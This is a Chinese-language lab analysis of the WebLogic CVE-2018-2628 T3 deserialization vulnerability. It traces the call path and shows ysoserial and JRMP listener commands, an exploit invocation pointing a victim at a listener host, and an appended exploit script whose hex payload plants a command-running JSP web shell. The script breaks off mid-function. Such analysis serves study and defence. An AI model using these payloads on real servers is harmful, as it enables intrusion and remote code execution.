<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="53fc6988a683d1a5006e976a972cd1e0">简介</h1>
<p>2018年4月18日，Oracle官方发布的CPU（Critical Patch Update）修复了编号为`CVE-2018-2628的反序列化漏洞。</p>
<p>受影响的WebLogic的WLS核心组件存在严重的安全漏洞，通过T3协议可以在前台无需账户登录的情况下进行远程任意代码执行，且CVE-2018-2628为CVE-2017-3248黑名单修复的绕过。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151622-3d7517b8-d0a2-1.png"/></p>
<p>影响版本：</p>
<ul>
<li>Weblogic 10.3.6.0</li>
<li>Weblogic 12.1.3.0</li>
<li>Weblogic 12.2.1.2</li>
<li>Weblogic 12.2.1.3</li>
</ul>
<h1 data-content="1" id="17c0355eb822296476af79c4db3759fc">漏洞分析</h1>
<p>测试环境：</p>
<ul>
<li>docker环境，<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628" target="_blank">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628</a>
</li>
<li>Weblogic 10.3.6.0</li>
<li>JDK1.6</li>
<li>IDEA 远程DEBUG</li>
</ul>
<p>在该测试环境下，CVE-2018-2628存在两种较为常用的利用方式:</p>
<ul>
<li>通过CVE-2016-1000031 Apache Commons Fileupload进行任意文件写入</li>
<li>通过ysoserial-JRMP模块进行远程代码执行</li>
</ul>
<p>使用k8脚本进行文件写入，查看Weblogic的错误日志，日志位置为：</p>
<div class="highlight"><pre><span></span>tail -f /Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
</pre></div>
<p>根据错误信息，得到反序列化漏洞调用栈信息如下：</p>
<div class="highlight"><pre><span></span><span class="n">at</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">349</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">InboundMsgAbbrev</span><span class="o">.</span><span class="na">readObject</span><span class="o">(</span><span class="n">InboundMsgAbbrev</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">66</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">InboundMsgAbbrev</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">InboundMsgAbbrev</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">38</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">MsgAbbrevJVMConnection</span><span class="o">.</span><span class="na">readMsgAbbrevs</span><span class="o">(</span><span class="n">MsgAbbrevJVMConnection</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">283</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">MsgAbbrevInputStream</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">MsgAbbrevInputStream</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">213</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">MsgAbbrevJVMConnection</span><span class="o">.</span><span class="na">dispatch</span><span class="o">(</span><span class="n">MsgAbbrevJVMConnection</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">498</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">t3</span><span class="o">.</span><span class="na">MuxableSocketT3</span><span class="o">.</span><span class="na">dispatch</span><span class="o">(</span><span class="n">MuxableSocketT3</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">330</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">.</span><span class="na">BaseAbstractMuxableSocket</span><span class="o">.</span><span class="na">dispatch</span><span class="o">(</span><span class="n">BaseAbstractMuxableSocket</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">387</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">.</span><span class="na">SocketMuxer</span><span class="o">.</span><span class="na">readReadySocketOnce</span><span class="o">(</span><span class="n">SocketMuxer</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">967</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">.</span><span class="na">SocketMuxer</span><span class="o">.</span><span class="na">readReadySocket</span><span class="o">(</span><span class="n">SocketMuxer</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">899</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">.</span><span class="na">PosixSocketMuxer</span><span class="o">.</span><span class="na">processSockets</span><span class="o">(</span><span class="n">PosixSocketMuxer</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">130</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">.</span><span class="na">SocketReaderRequest</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">SocketReaderRequest</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">29</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">.</span><span class="na">SocketReaderRequest</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">SocketReaderRequest</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">42</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">kernel</span><span class="o">.</span><span class="na">ExecuteThread</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">ExecuteThread</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">145</span><span class="o">)</span>
<span class="n">at</span> <span class="n">weblogic</span><span class="o">.</span><span class="na">kernel</span><span class="o">.</span><span class="na">ExecuteThread</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">ExecuteThread</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">117</span><span class="o">)</span>
</pre></div>
<p>根据调用栈信息可以确定断点调试位置并发现<code>muxer</code>（多路复用器），WebLogic Server使用称为<code>muxer</code>的软件模块来读取服务器上的传入请求和客户端上的传入响应。这些复用器有两种主要类型： Java muxer或native muxer。</p>
<p>Java muxer具有以下特征：</p>
<ul>
<li>使用纯Java从套接字读取数据。</li>
<li>它也是可用于RMI客户端的唯一复用器。</li>
<li>读取时阻塞，直到要从套接字读取数据为止。</li>
</ul>
<p>weblogic.socket.SocketReaderRequest#run</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151654-50bfdcfe-d0a2-1.png"/></p>
<p><code>SocketReaderRequest::run</code>开始分析，<code>SocketMuxer.getMuxer()</code>得到<code>PosixSocketMuxer</code>对象，跟进对应调用的<code>processSockets</code>方法。</p>
<p>weblogic/socket/PosixSocketMuxer.class:128</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151706-57cd635e-d0a2-1.png"/></p>
<p>通过<code>PosixSocketInfo</code>类的var16的<code>getMuxableSocket</code>方法获取<code>MuxableSocket</code>对象<code>var17</code>，将套接字传入<code>readReadySocket</code></p>
<p>weblogic.socket.SocketMuxer#readReadySocket</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151715-5d2b8916-d0a2-1.png"/></p>
<p>套接字传入<code>readReadySocketOnce</code>函数</p>
<p>weblogic.jar!/weblogic/socket/SocketMuxer.class:650</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151722-6183633a-d0a2-1.png"/></p>
<p>套接字调用<code>dispatch</code>函数进行调度分发</p>
<p>weblogic.socket.BaseAbstractMuxableSocket#dispatch()</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151730-661603bc-d0a2-1.png"/></p>
<p>weblogic.socket.BaseAbstractMuxableSocket#makeChunkList</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151739-6baa1ade-d0a2-1.png"/></p>
<p><code>this.makeChunkList()</code>返回<code>Chunk</code>对象，并作为参数继续传入<code>dispatch</code></p>
<p>weblogic.rjvm.t3.MuxableSocketT3#dispatch</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151747-7045fc8e-d0a2-1.png"/></p>
<p><code>this.connection</code>对象为<code>MuxableSocketT3</code>类，调用<code>dispatch</code>并传入<code>Chunk</code>对象</p>
<p>weblogic.rjvm.MsgAbbrevJVMConnection#dispatch</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151755-753d31a8-d0a2-1.png"/></p>
<p><code>var2</code>为<code>ConnectionManager</code>对象，调用<code>var2.getInputStream()</code>获取<code>MsgAbbrevInputStream</code>对象<code>var3</code>，继续调用<code>init</code>函数。</p>
<p>weblogic.rjvm.MsgAbbrevInputStream#init</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151804-7a2d3208-d0a2-1.png"/></p>
<p>继续调用<code>readMsgAbbrevs</code>函数</p>
<p>weblogic.rjvm.MsgAbbrevJVMConnection#readMsgAbbrevs</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151812-7eee58c6-d0a2-1.png"/></p>
<p><code>InboundMsgAbbrev</code>对象<code>var3</code>调用<code>read</code>函数</p>
<p>weblogic.rjvm.InboundMsgAbbrev#read</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151819-8361ebca-d0a2-1.png"/></p>
<p>在循环中调用<code>readObject</code>函数，并传入<code>MsgAbbrevInputStream</code>对象。</p>
<p>weblogic.rjvm.InboundMsgAbbrev#readObject</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151827-884705e4-d0a2-1.png"/></p>
<p>创建<code>ServerChannelInputStream</code>对象，调用<code>readObject</code>函数，触发反序列化漏洞。</p>
<h2 data-content="1" id="0e8e221cd0596a72095a11bdf54b24e9">Apache Commons Fileupload</h2>
<p>Apache Commons FileUpload在<code>1.3.3</code>版本前存在任意文件上传漏洞，在JDK1.6环境下没有空字符保护，可以利用<code>\u0000</code>对文件名进行截断，对任意位置写入恶意文件，进行远程代码执行。</p>
<h3 data-content="1" id="0eff8f5474a9c926e8392ce2eb49d9a9">POC</h3>
<p>ysoserial中支持对Apache Commons Fileupload的利用，命令如下：</p>
<div class="highlight"><pre><span></span>java -jar ysoserial.jar FileUpload1 <span class="s2">"writeOld;test\shell.jsp;rai4over"</span>
</pre></div>
<p>在最后一个字符串参数中指定具体的行为，<code>writeOld</code>老旧JDK写操作、<code>test\shell.jsp</code>写入路径、<code>rai4over</code>为写入内容。</p>
<p>ysoserial.payloads.FileUpload1#getObject</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151843-91a3b06a-d0a2-1.png"/></p>
<p><code>;</code>分割最后一个字符串参数，判断行为后进入对应分支调用函数，可以看到多个不同行为，选择新老JDK、是否进行<code>Base64</code>编码，<code>writeOld</code>则是使用老jdk1.6进行任意文件写入。</p>
<p>ysoserial.payloads.FileUpload1#writePre131</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151907-9ffdbc8c-d0a2-1.png"/></p>
<p>路径和截断符号<code>\0</code>拼接后传入<code>makePayload</code>函数</p>
<p>ysoserial.payloads.FileUpload1#makePayload</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151915-a4f2ace8-d0a2-1.png"/></p>
<p>根据写入路径<code>test\shell.jsp</code>创建<code>File</code>对象<code>repository</code>，作为参数传入<code>DiskFileItem</code>的构造函数</p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#DiskFileItem</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151924-aa33fe96-d0a2-1.png"/></p>
<p>依次赋值，然后回到上层<code>makePayload</code>函数。</p>
<p>ysoserial.payloads.FileUpload1#makePayload</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151942-b501c128-d0a2-1.png"/></p>
<p>创建<code>DeferredFileOutputStream</code>对象<code>dfos</code>，然后通过反射将恶意文件内容<code>rai4over</code>写入<code>dfos</code>的<code>memoryOutputStream</code>成员，最后都添加到<code>diskFileItem</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151949-b927c6da-d0a2-1.png"/></p>
<p>恶意<code>diskFileItem</code>构造完成，<code>ysoserial</code>对其进行序列化，<code>writeObject</code>进行了重写</p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#writeObject</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728151957-bdf78d58-d0a2-1.png"/></p>
<p>进入<code>if</code>分支，调用<code>get</code>函数。</p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#get</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152004-c20be38a-d0a2-1.png"/></p>
<p>调用<code>getData</code>函数，并赋值<code>cachedContent</code></p>
<p>org.apache.commons.io.output.DeferredFileOutputStream#getData</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152011-c65ac1cc-d0a2-1.png"/></p>
<p>最后的<code>diskFileItem</code>对象为：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152020-cb4f1778-d0a2-1.png"/></p>
<h3 data-content="1" id="9ba25644c395ec42b3ff6ffa191eef44">Gadget chain</h3>
<p>Weblogic中存在的可进行漏洞利用<code>commons-fileupload.jar</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152032-d2a6d16e-d0a2-1.png"/></p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#readObject</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152040-d74469f2-d0a2-1.png"/></p>
<p>调用<code>getOutputStream</code>函数</p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#getOutputStream</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152047-dbae282a-d0a2-1.png"/></p>
<p>判断的<code>dfos == null</code>成立，进入<code>if</code>分支，并调用<code>getTempFile()</code>函数</p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#getTempFile</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152055-e0879ec6-d0a2-1.png"/></p>
<p>通过File创建文件流，文件的位置为<code>tempDir</code>+<code>fileName</code>，此时的变量：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152102-e448a816-d0a2-1.png"/></p>
<p><code>fileName</code>为随机生成不可控，被<code>\u0000</code>截断后文件流的位置为可控的<code>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/wlscmd.jsp</code>，然后返回到上层<code>readObject</code>函数。</p>
<p>org.apache.commons.fileupload.disk.DiskFileItem#readObject</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152118-ee38231a-d0a2-1.png"/></p>
<p><code>this.cachedContent</code>变量不为<code>null</code>且为恶意shell内容，进入<code>if</code>判断分支，完成文件流写入。</p>
<h2 data-content="1" id="e160ceee3ce2d6391484ea10b6b9ea93">ysoserial-JRMP</h2>
<p>在<code>InboundMsgAbbrev</code>的<code>resolveProxyClass</code>方法中使用了黑名单对反序列化类进行限制：</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveProxyClass</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">interfaces</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
   <span class="n">String</span><span class="o">[]</span> <span class="n">arr$</span> <span class="o">=</span> <span class="n">interfaces</span><span class="o">;</span>
   <span class="kt">int</span> <span class="n">len$</span> <span class="o">=</span> <span class="n">interfaces</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

   <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i$</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i$</span> <span class="o">&lt;</span> <span class="n">len$</span><span class="o">;</span> <span class="o">++</span><span class="n">i$</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">intf</span> <span class="o">=</span> <span class="n">arr$</span><span class="o">[</span><span class="n">i$</span><span class="o">];</span>
      <span class="k">if</span><span class="o">(</span><span class="n">intf</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"java.rmi.registry.Registry"</span><span class="o">))</span> <span class="o">{</span>
         <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">"Unauthorized proxy deserialization"</span><span class="o">);</span>
      <span class="o">}</span>
   <span class="o">}</span>

   <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveProxyClass</span><span class="o">(</span><span class="n">interfaces</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>对<code>java.rmi.registry.Registry</code>进行了过滤，但可以使用<code>java.rmi.activation.Activator</code>进行绕过。</p>
<h3 data-content="1" id="c9994177578af76e719598bb928e5ee5">POC</h3>
<p>下载包含<code>java.rmi.activation.Activator</code>链的ysoserial工具：</p>
<div class="highlight"><pre><span></span>wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
</pre></div>
<p>对应文件为：</p>
<div class="highlight"><pre><span></span>ysoserial/src/main/java/ysoserial/payloads/JRMPClient2.java
</pre></div>
<p>开启使用<code>CommonsCollections1</code>恶意的JRMP Server：</p>
<div class="highlight"><pre><span></span>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener <span class="m">8888</span> CommonsCollections1 <span class="s1">'touch /tmp/rai4over'</span>
</pre></div>
<p>使用<a href="https://www.exploit-db.com/exploits/44553" target="_blank">攻击脚本</a>：</p>
<div class="highlight"><pre><span></span>python exp.py <span class="m">127</span>.0.0.1 <span class="m">7001</span> ysoserial-0.0.6-SNAPSHOT-BETA-all.jar <span class="m">10</span>.0.3.169 <span class="m">8888</span> JRMPClient2
</pre></div>
<h3 data-content="1" id="4d95f6990d9a0481100bde922499c935">Gadget chain</h3>
<p>受害服务器第一次反序列化成为<code>JRMP</code>客户端，并连接恶意的<code>JRMP</code>服务端，<a href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E5%87%BA%E5%9D%91" target="_blank">和<code>java.rmi.registry.Registry</code>没什么区别</a>，整体的调用栈如下：</p>
<div class="highlight"><pre><span></span><span class="nl">registerRefs:</span><span class="mi">120</span><span class="o">,</span> <span class="n">DGCClient</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">transport</span><span class="o">)</span>
<span class="nl">read:</span><span class="mi">294</span><span class="o">,</span> <span class="n">LiveRef</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">transport</span><span class="o">)</span>
<span class="nl">readExternal:</span><span class="mi">473</span><span class="o">,</span> <span class="n">UnicastRef</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">438</span><span class="o">,</span> <span class="n">RemoteObject</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">39</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">25</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">597</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">969</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1871</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1775</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1327</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">defaultReadFields:</span><span class="mi">1969</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1893</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1775</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1327</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">349</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">66</span><span class="o">,</span> <span class="n">InboundMsgAbbrev</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">)</span>
<span class="nl">read:</span><span class="mi">38</span><span class="o">,</span> <span class="n">InboundMsgAbbrev</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">)</span>
<span class="nl">readMsgAbbrevs:</span><span class="mi">283</span><span class="o">,</span> <span class="n">MsgAbbrevJVMConnection</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">)</span>
<span class="nl">init:</span><span class="mi">213</span><span class="o">,</span> <span class="n">MsgAbbrevInputStream</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">)</span>
<span class="nl">dispatch:</span><span class="mi">498</span><span class="o">,</span> <span class="n">MsgAbbrevJVMConnection</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">)</span>
<span class="nl">dispatch:</span><span class="mi">330</span><span class="o">,</span> <span class="n">MuxableSocketT3</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">rjvm</span><span class="o">.</span><span class="na">t3</span><span class="o">)</span>
<span class="nl">dispatch:</span><span class="mi">387</span><span class="o">,</span> <span class="n">BaseAbstractMuxableSocket</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">)</span>
<span class="nl">readReadySocketOnce:</span><span class="mi">967</span><span class="o">,</span> <span class="n">SocketMuxer</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">)</span>
<span class="nl">readReadySocket:</span><span class="mi">899</span><span class="o">,</span> <span class="n">SocketMuxer</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">)</span>
<span class="nl">processSockets:</span><span class="mi">130</span><span class="o">,</span> <span class="n">PosixSocketMuxer</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">)</span>
<span class="nl">run:</span><span class="mi">29</span><span class="o">,</span> <span class="n">SocketReaderRequest</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">)</span>
<span class="nl">execute:</span><span class="mi">42</span><span class="o">,</span> <span class="n">SocketReaderRequest</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">socket</span><span class="o">)</span>
<span class="nl">execute:</span><span class="mi">145</span><span class="o">,</span> <span class="n">ExecuteThread</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">kernel</span><span class="o">)</span>
<span class="nl">run:</span><span class="mi">117</span><span class="o">,</span> <span class="n">ExecuteThread</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">kernel</span><span class="o">)</span>
</pre></div>
<p>sun.rmi.transport.DGCClient#registerRefs</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200728152127-f31ac3a6-d0a2-1.png"/></p>
<h1 data-content="1" id="0589b02d0d335778866e46359a1b979b">附件</h1>
<p>K8 Apache Commons Fileupload EXP:</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>

<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>


<span class="k">def</span> <span class="nf">generate_payload</span><span class="p">(</span><span class="n">path_ysoserial</span><span class="p">,</span> <span class="n">jrmp_listener_ip</span><span class="p">,</span> <span class="n">jrmp_listener_port</span><span class="p">,</span> <span class="n">jrmp_client</span><span class="p">):</span>

    <span class="c1">#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp</span>
    <span class="k">return</span> <span class="s2">"aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878"</span>


<span class="k">def</span> <span class="nf">t3_handshake</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_addr</span><span class="p">):</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_addr</span><span class="p">)</span>
